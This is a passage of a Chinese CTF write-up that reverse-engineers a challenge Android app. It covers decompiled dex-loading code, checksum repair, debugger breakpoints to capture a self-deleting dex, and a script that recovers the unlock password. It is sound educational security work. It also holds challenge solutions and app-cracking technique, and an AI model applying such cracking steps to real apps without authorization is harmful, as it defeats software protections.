border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">A</span> {<br />    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">SUCCESS_TAG</span> = <span style="color: rgb(168, 255, 96);">"唉!"</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">b</span>() {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">c</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(Context context0, String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br />}</code></pre><p>"fix"函数以及与之对应的"read"函数是这样的</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> File <span style="color: rgb(255, 255, 182);">fix</span>(ByteBuffer byteBuffer0, <span style="color: rgb(255, 255, 182);">int</span> v, <span style="color: rgb(255, 255, 182);">int</span> v1, <span style="color: rgb(255, 255, 182);">int</span> v2, Context context0) <span style="color: rgb(150, 203, 254);">throws</span> Exception {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = context0.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v3</span> = (<span style="color: rgb(255, 255, 182);">int</span>)(((Integer)D.getClassDefData(byteBuffer0, v).get(<span style="color: rgb(168, 255, 96);">"class_data_off"</span>)));<br />            <span style="color: rgb(255, 255, 182);">HashMap</span> <span style="color: rgb(198, 197, 254);">hashMap0</span> = D.getClassData(byteBuffer0, v3);<br />            ((<span style="color: rgb(255, 255, 182);">int</span>[][])hashMap0.get(<span style="color: rgb(168, 255, 96);">"direct_methods"</span>))[v1][<span style="color: rgb(255, 115, 253);">2</span>] = v2;<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b = D.encodeClassData(hashMap0);<br />            byteBuffer0.position(v3);<br />            byteBuffer0.put(arr_b);<br />            byteBuffer0.position(<span style="color: rgb(255, 115, 253);">0x20</span>);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b1 = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">byte</span>[byteBuffer0.capacity() - <span style="color: rgb(255, 115, 253);">0x20</span>];<br />            byteBuffer0.get(arr_b1);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b2 = Utils.getSha1(arr_b1);<br />            byteBuffer0.position(<span style="color: rgb(255, 115, 253);">12</span>);<br />            byteBuffer0.put(arr_b2);<br />            <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v4</span> = Utils.checksum(byteBuffer0);<br />            byteBuffer0.position(<span style="color: rgb(255, 115, 253);">8</span>);<br />            byteBuffer0.putInt(Integer.reverseBytes(v4));<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b3 = byteBuffer0.array();<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file1</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(file0, <span style="color: rgb(168, 255, 96);">"2.dex"</span>);<br />            <span style="color: rgb(255, 255, 182);">FileOutputStream</span> <span style="color: rgb(198, 197, 254);">fileOutputStream0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">FileOutputStream</span>(file1);<br />            fileOutputStream0.write(arr_b3);<br />            fileOutputStream0.close();<br />            <span style="color: rgb(150, 203, 254);">return</span> file1;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> ByteBuffer <span style="color: rgb(255, 255, 182);">read</span>(Context context0) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(context0.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>), <span style="color: rgb(168, 255, 96);">"decode.dex"</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span>(!file0.exists()) {<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />            }<br /><br />            <span style="color: rgb(255, 255, 182);">FileInputStream</span> <span style="color: rgb(198, 197, 254);">fileInputStream0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">FileInputStream</span>(file0);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">byte</span>[fileInputStream0.available()];<br />            fileInputStream0.read(arr_b);<br />            <span style="color: rgb(255, 255, 182);">ByteBuffer</span> <span style="color: rgb(198, 197, 254);">byteBuffer0</span> = ByteBuffer.wrap(arr_b);<br />            fileInputStream0.close();<br />            <span style="color: rgb(150, 203, 254);">return</span> byteBuffer0;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }</code></pre><p>看看chatgpt对以上代码的分析：</p><p>这段代码是一个Android应用中的一些Java代码，主要涉及到动态加载Dex文件的操作。下面我来逐个分析这几个函数的作用：</p><ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">fix(ByteBuffer byteBuffer0, int v, int v1, int v2, Context context0)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">ByteBuffer byteBuffer0</code>：包含Dex文件内容的缓冲区。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">int v, int v1, int v2</code>：用于指定要修改的数据的位置和值。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象，用于获取应用程序的目录等信息。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是修复一个ByteBuffer中的Dex文件，其中包括了修改Dex文件中的一些数据。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>解析Dex文件中的类数据和方法数据。</p></li><li style="margin-left: 2px;"><p>根据传入的参数修改方法数据中的某个值。</p></li><li style="margin-left: 2px;"><p>将修改后的数据写回ByteBuffer中。</p></li><li style="margin-left: 2px;"><p>计算并更新Dex文件的SHA1校验和和校验码。</p></li><li style="margin-left: 2px;"><p>将修改后的ByteBuffer写入到应用程序的私有目录中，并返回该文件。</p></li></ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">getStaticMethod(Context context0, int[] arr_v, String s, String s1, Class[] arr_class)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">int[] arr_v</code>：一个整型数组，用于指定修复Dex文件时所需的参数。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">String s, String s1</code>：要调用的类名和方法名。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Class[] arr_class</code>：方法参数的类型数组。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是获取一个静态方法。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>调用<code style="font-family: SFMono-Regular, Consolas, ;">fix()</code>函数修复Dex文件，并获取修复后的文件。</p></li><li style="margin-left: 2px;"><p>使用修复后的Dex文件创建一个DexClassLoader。</p></li><li style="margin-left: 2px;"><p>加载指定类名的类，并获取其中声明的静态方法。</p></li><li style="margin-left: 2px;"><p>删除修复后的文件和其在私有目录中的引用。</p></li><li style="margin-left: 2px;"><p>返回获取到的静态方法。</p></li></ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">isValidate(Context context0, String s, int[] arr_v)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">String s</code>：要验证的字符串。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">int[] arr_v</code>：一个整型数组，用于指定修复Dex文件时所需的参数。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是验证某个字符串。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>返回值：返回验证结果的字符串。</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>调用<code style="font-family: SFMono-Regular, Consolas, ;">getStaticMethod()</code>函数获取指定类的静态方法。</p></li><li style="margin-left: 2px;"><p>调用获取到的静态方法来进行验证，并返回结果。</p></li></ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">read(Context context0)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是读取Dex文件。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>返回值：返回读取到的Dex文件的ByteBuffer。</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>构造Dex文件的路径。</p></li><li style="margin-left: 2px;"><p>读取Dex文件内容到一个字节数组中。</p></li><li style="margin-left: 2px;"><p>将字节数组包装成ByteBuffer，并返回。</p></li></ol></ol><p>这些函数主要用于动态加载并修复Dex文件，然后执行其中的方法来实现某些功能。</p><h3>思路</h3><p>目前flag的关键在于两点，一个是图形锁代表的字符串s，一个是修复dex以后两个"?"的内容，</p><h3>动态分析&amp;dex修复*3</h3><h4>修复1</h4><p>静态分析结束，下面用010Editor打开classes.dex，图中可以明显看到dex的Adler32校验值和sha1校验值是错误的<br />也就是说附件里的classes.dex文件是损坏的</p><p><span style="font-weight: 700;">dex校验值损坏后，在反射加载类过程中会被系统拒绝，因此必须进行修复操作</span></p><p>读取logcat可见如下错误</p><blockquote><p style="margin-bottom: 15px;">E System : Unable to Load dex file: /data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex</p><p style="margin-bottom: 15px;">E System : java.io.IOException: Failed to open dex files : from /data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex because: Failure to verify dex file ' /data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex': Bad Checksum (c607ea12, expected 22dcea4c)</p></blockquote><p>可见系统确实因校验值异常，拒绝加载了assets下复制的classes.dex</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ff75dcf8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKRdhyZV7Mpib8W5trDk38p9HcuysBicwLKPyZEBSswvcu1Ih2PI9wBkPw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>由于dex文件在010Editor中除了头部外并无明显异常情况，因此我们使用DexRepair对dex头部进行修复：<code style="font-family: SFMono-Regular, Consolas, ;">java -jar DexRepair.jar /path/to/dex</code></p><p>修复后头部变为全绿：<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=aead342a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKUoOXe430y1umbMQ0HysxuBias4YianNdrWVdyLFgCzxaQ82VicISC8PIA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>将修复完的dex命名为<code style="font-family: SFMono-Regular, Consolas, ;">classes.dex</code>，置入assets文件夹，重新打包、签名<br />打开jeb调试，发现依然无法正常运行</p><h4>修复2</h4><p>单步调试，定位到错误发生点，发现是程序在</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">try</span> {<br />    <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(context0.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>), <span style="color: rgb(168, 255, 96);">"decode.dex"</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span>(!file0.exists()) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />    }<br />}</code></pre><p>处返回了null，即这个file0，也就是<code style="font-family: SFMono-Regular, Consolas, ;">decode.dex</code>不存在<br />然后程序跳转到了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />    Log.e(<span style="color: rgb(168, 255, 96);">"ZJ595"</span>, <span style="color: rgb(168, 255, 96);">"咦，似乎是坏掉的dex呢！"</span>);<br />    exception0.printStackTrace();<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">""</span>;<br />}</code></pre><p>打开<code style="font-family: SFMono-Regular, Consolas, ;">adb logcat</code>工具可见返回的错误信息：</p><blockquote><p style="margin-bottom: 15px;">E ZJ595 咦，似乎是坏掉的dex呢！</p></blockquote><p>可见确实是文件不存在的原因导致程序运行异常</p><p>不存在我们就手动新建一个，为了方便起见我就直接复制了一份1.dex，将其改名为decode.dex，使用RE文件管理器放置于与1.dex同目录下（即<code style="font-family: SFMono-Regular, Consolas, ;">data/user/0/com.zj.wuaipojie2024_2/app_data</code>），这样这部分代码就能正常跑起来了</p><p>根据"静态分析"部分代码分析，由于<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>文件在写入、加载后即会进行自我删除，于是需要在删除代码位置下断点以保存该中间文件进行分析，断点位置如下：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">.method</span><span style="color: rgb(150, 203, 254);"> private</span><span style="color: rgb(150, 203, 254);"> static</span> varargs getStaticMethod(Context, [I, String, String, [Class)Method<br />          .registers 11<br />          .annotation<span style="color: rgb(150, 203, 254);"> system</span> Signature<br />              value = {<br />                  <span style="color: rgb(168, 255, 96);">"("</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Landroid/content/Context;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"[I"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/String;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/String;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"["</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/Class&lt;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"*&gt;;)"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/reflect/Method;"</span><br />              }<span style="color: rgb(150, 203, 254);"><br />          .end annotation</span><br />          .annotation<span style="color: rgb(150, 203, 254);"> system</span> Throws<br />              value = {<br />                  Exception<br />              }<span style="color: rgb(150, 203, 254);"><br />          .end annotation</span><br />00000000  const/4             v0, 0<span style="color: rgb(150, 203, 254);"><br />:try_2</span><br />00000002  invoke-static       C-&gt;read(Context)ByteBuffer, p0<br />00000008  move-result-object  v1<br />0000000A  const/4             v2, 0<br />0000000C  aget                v3, p1, v2<br />00000010  const/4             v4, 1<br />00000012  aget                v4, p1, v4<br />00000016  const/4             v5, 2<br />00000018  aget                p1, p1, v5<br />0000001C  invoke-static       C-&gt;fix(ByteBuffer, I, I, I, Context)File, v1, v3, v4, p1, p0<br />00000022  move-result-object  p1<br />00000024  invoke-virtual      Object-&gt;getClass()Class, p0<br />0000002A  move-result-object  v1<br />0000002C  invoke-virtual      Class-&gt;getClassLoader()ClassLoader, v1<br />00000032  move-result-object  v1<br />00000034  const-string        v3, <span style="color: rgb(168, 255, 96);">"fixed"</span><br />00000038  invoke-virtual      Context-&gt;getDir(String, I)File, p0, v3, v2<br />0000003E  move-result-object  p0<br />00000040  new-instance        v2, DexClassLoader<br />00000044  invoke-virtual      File-&gt;getAbsolutePath()String, p1<br />0000004A  move-result-object  v3<br />0000004C  invoke-virtual      File-&gt;getAbsolutePath()String, p0<br />00000052  move-result-object  v4<br />00000054  invoke-direct       DexClassLoader-&gt;&lt;init&gt;(String, String, String, ClassLoader)V, v2, v3, v4, v0, v1<br />0000005A  invoke-virtual      DexClassLoader-&gt;loadClass(String)Class, v2, p2<br />00000060  move-result-object  p2<br />00000062  invoke-virtual      Class-&gt;getDeclaredMethod(String, [Class)Method, p2, p3, p4<br />00000068  move-result-object  p2<br />0000006A  invoke-virtual      File-&gt;delete()Z, p1  <span style="color: rgb(124, 124, 124);">#在此处下断点，防止文件删除</span><br />00000070  new-instance        p3, File<br />00000074  invoke-virtual      File-&gt;getName()String, p1<br />0000007A  move-result-object  p1<br />0000007C  invoke-direct       File-&gt;&lt;init&gt;(File, String)V, p3, p0, p1<br />00000082  invoke-virtual      File-&gt;delete()Z, p3<br />          .catch Exception {:try_2 ..<span style="color: rgb(150, 203, 254);"> :tryend_88</span>}<span style="color: rgb(150, 203, 254);"> :catch_8A</span><span style="color: rgb(150, 203, 254);"><br />:tryend_88</span><br />00000088  return-object       p2<span style="color: rgb(150, 203, 254);"><br />:catch_8A</span>  <span style="color: rgb(124, 124, 124);"># used for: Ljava/lang/Exception;</span><br />0000008A  move-exception      p0<br />0000008C  invoke-virtual      Exception-&gt;printStackTrace()V, p0<br />00000092  return-object       v0<span style="color: rgb(150, 203, 254);"><br />.end method</span></code></pre><p>然后在<code style="font-family: SFMono-Regular, Consolas, ;">data/user/0/com.zj.wuaipojie2024_2/app_data</code>下即可找到修复后的<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>文件</p><p>修复后的<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>中的A类如下：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">package</span> com.zj.wuaipojie2024_2;<br /><br /><span style="color: rgb(150, 203, 254);">import</span> android.content.Context;<br /><br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">A</span> {<br />    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">SUCCESS_TAG</span> = <span style="color: rgb(168, 255, 96);">"唉!"</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">b</span>() {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">c</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(Context context0, String s) {<br />        MainActivity.sSS(s);<br />        <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s1</span> = Utils.getSignInfo(context0);<br />        <span style="color: rgb(150, 203, 254);">if</span>(s1 != <span style="color: rgb(198, 197, 254);">null</span> &amp;&amp; (s1.equals(<span style="color: rgb(168, 255, 96);">"fe4f4cec5de8e8cf2fca60a4e61f67bcd3036117"</span>))) {<br />            <span style="color: rgb(255, 255, 182);">StringBuffer</span> <span style="color: rgb(198, 197, 254);">stringBuffer0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuffer</span>();<br />            <span style="color: rgb(150, 203, 254);">for</span>(<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v</span> = <span style="color: rgb(255, 115, 253);">0</span>; stringBuffer0.length() &lt; <span style="color: rgb(255, 115, 253);">9</span> &amp;&amp; v &lt; <span style="color: rgb(255, 115, 253);">40</span>; ++v) {<br />                <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s2</span> = <span style="color: rgb(168, 255, 96);">"0485312670fb07047ebd2f19b91e1c5f"</span>.substring(v, v + <span style="color: rgb(255, 115, 253);">1</span>);<br />                <span style="color: rgb(150, 203, 254);">if</span>(!stringBuffer0.toString().contains(s2)) {<br />                    stringBuffer0.append(s2);<br />                }<br />            }<br /><br />            <span style="color: rgb(150, 203, 254);">return</span> s.equals(stringBuffer0.toString().toUpperCase()) ? <span style="color: rgb(168, 255, 96);">"唉!哪有什么亿载沉睡的玄天帝，不过是一位被诅咒束缚的旧日之尊，在灯枯之际挣扎的南柯一梦罢了。有缘人，这份机缘就赠予你了。坐标在B.d"</span> : <span style="color: rgb(168, 255, 96);">""</span>;<br />        }<br /><br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">""</span>;<br />    }<br />}</code></pre><p>此处的A.d函数给出了密码<code style="font-family: SFMono-Regular, Consolas, ;">s</code>的真值以及一个提示</p><p>写个小程序获取解锁密码<code style="font-family: SFMono-Regular, Consolas, ;">s</code>：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> java.io.*;<br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">GetPass</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">main</span>(String[] args) {<br />        <span style="color: rgb(255, 255, 182);">StringBuffer</span> <span style="color: rgb(198, 197, 254);">stringBuffer0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuffer</span>();<br />        <span style="color: rgb(150, 203, 254);">for</span>(<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v</span> = <span style="color: rgb(255, 115, 253);">0</span>; stringBuffer0.length() &lt; <span style="color: rgb(255, 115, 253);">9</span> &amp;&amp; v &lt; <span style="color: rgb(255, 115, 253);">40</span>; ++v) {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s2</span> = <span style="color: rgb(168, 255, 96);">"0485312670fb07047ebd2f19b91e1c5f"</span>.substring(v, v + <span style="color: rgb(255, 115, 253);">1</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span>(!stringBuffer0.toString().contains(s2)) {<br />                stringBuffer0.append(s2);<br />            }<br />        }<br />        System.out.println(stringBuffer0.toString().toUpperCase());<br />    }<br />}</code></pre><p>输出为：</p><blockquote><p style="margin-bottom: 15px;">048531267 （九宫格密码的真值，后续会用到）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cfdc5858&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9JoolO4XtMbkEBZJEBuqw6Fkk2CNibjDb18kKHaqiaJo8RKV3aKfhwBQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></blockquote><p>下面来看看提示：</p><blockquote><p style="margin-bottom: 15px;">"唉!哪有什么亿载沉睡的玄天帝，不过是一位被诅咒束缚的旧日之尊，在灯枯之际挣扎的南柯一梦罢了。有缘人，这份机缘就赠予你了。坐标在B.d"</p></blockquote><p>找到B类......<br />（怎么还是讨厌的"?"+s+"?"）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 